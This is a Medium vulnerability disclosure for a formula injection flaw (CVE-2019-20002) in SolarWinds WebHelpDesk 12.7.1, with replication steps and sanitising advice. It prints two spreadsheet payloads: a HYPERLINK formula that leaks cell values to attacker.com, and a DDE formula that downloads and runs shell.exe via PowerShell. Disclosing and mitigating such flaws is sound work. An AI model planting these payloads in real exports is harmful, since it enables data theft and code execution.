=== Content from medium.com_3887f232_20250121_002631.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F37569cd4cdc1&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40ayaan.saikia91%2Fformula-injection-vulnerability-on-solarwinds-webhelpdesk-12-7-1-37569cd4cdc1&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40ayaan.saikia91%2Fformula-injection-vulnerability-on-solarwinds-webhelpdesk-12-7-1-37569cd4cdc1&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# **Formula Injection Vulnerability on SolarWinds WebHelpDesk 12.7.1**

[![AYAAN LATIF SAIKIA](https://miro.medium.com/v2/resize:fill:88:88/0*TWl3UOUG2SqcRaUF.jpg)](/%40ayaan.saikia91?source=post_page---byline--37569cd4cdc1--------------------------------)

[AYAAN LATIF SAIKIA](/%40ayaan.saikia91?source=post_page---byline--37569cd4cdc1--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F9993b096843a&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ayaan.saikia91%2Fformula-injection-vulnerability-on-solarwinds-webhelpdesk-12-7-1-37569cd4cdc1&user=AYAAN+LATIF+SAIKIA&userId=9993b096843a&source=post_page-9993b096843a--byline--37569cd4cdc1---------------------post_header-----------)

3 min read·Apr 24, 2020

--

Listen

Share

**What is the vulnerability?**

Formula Injection occurs when untrusted input is embedded within TSV/CSV files which could be interpreted by the spreadsheet application as formulas to be computed.

*This issue has been assigned CVE-2019–20002.*

**What is the security impact?**

An attacker can use this vulnerability to create malicious payloads in the vulnerable field, when exported by user in CSV format, this can cause the user to be tricked into visiting malicious hyperlinks, executing commands etc.

For eg:

***Payload 1: =HYPERLINK(“https://www.attacker.com?leak="&A2&B2,"Error: Click here for additional information”)***

This payload plays on the trust relationship that a victim will have with the server and the content provided by it. Once this payload has been placed, the attacker just has to wait for their victim to take the bait. When the victim downloads and opens the file, they will see the attacker’s error message and, given that the file came from a trusted source, will likely click on the cell to investigate the error:
 Once the victim clicks on the link, their browser will open and submit a request to the attacker’s domain along with the exfiltrated values from the specified cells.

***Payload 2: =cmd|’/C powershell IEX(wget attacker\_server/shell.exe)’!A0***

This payload will cause a malicious file to be downloaded from attackers server using powershell and executed.

**Replication Steps:**

1. Create a new ticket as a user.

2. Fill in the ticket details.

3. In one of the text fields(e.g. Subject) enter a malicious payload.

4. Log in as admin user and view the tickets in Queue

5. Export tickets in Excel TSV format.

6. Open the downloaded file and click on the cell

6. You will be taken to the link in the malicious hyperlink.

**Proof of Concept:**

Fig 1. Create a ticket as a user, and put malicious payload in Subject field

![]()

Fig 2. Admin user views tickets in his queue

![]()

Fig 3. Admin user downloads ticket details in TSV format

![]()

Fig 4. Admin user opens exported TSV file

![]()

Fig 5. On clicking the cell, the unsuspecting user will be taken to malicious website.

![]()

**Recommendations:**

Preventing this attack is as simple as blocking a few key characters. All formulas require one of four special characters, and if you prevent these than you mitigate this vulnerability:

*Equals to (=)*
 *Plus (+)*
 *Minus (-)*
 *At (@)*

These characters can either be sanitized or the server can check the content of the uploaded file before allowing it to be uploaded, rejecting any file containing the disallowed characters. This can help ensure the attacker’s payload will never get successfully delivered.

***Note:*** The vulnerability has been fixed with latest product release of Web Help Desk 12.7.2 which was made publicly available on April 14, 2020.

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —

--

--

[![AYAAN LATIF SAIKIA](https://miro.medium.com/v2/resize:fill:96:96/0*TWl3UOUG2SqcRaUF.jpg)](/%40ayaan.saikia91?source=post_page---post_author_info--37569cd4cdc1--------------------------------)[![AYAAN LATIF SAIKIA](https://miro.medium.com/v2/resize:fill:128:128/0*TWl3UOUG2SqcRaUF.jpg)](/%40ayaan.saikia91?source=post_page---post_author_info--37569cd4cdc1--------------------------------)Follow[## Written by AYAAN LATIF SAIKIA](/%40ayaan.saikia91?source=post_page---post_author_info--37569cd4cdc1--------------------------------)[3 Followers](/%40ayaan.saikia91/followers?source=post_page---post_author_info--37569cd4cdc1--------------------------------)·[2 Following](/%40ayaan.saikia91/following?source=post_page---post_author_info--37569cd4cdc1--------------------------------)Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----37569cd4cdc1--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----37569cd4cdc1--------------------------------)[About](/about?autoplay=1&source=post_page-----37569cd4cdc1--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----37569cd4cdc1--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----37569cd4cdc1--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----37569cd4cdc1--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----37569cd4cdc1--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----37569cd4cdc1--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----37569cd4cdc1--------------------------------)[Teams](/business?source=post_page-----37569cd4cdc1--------------------------------)


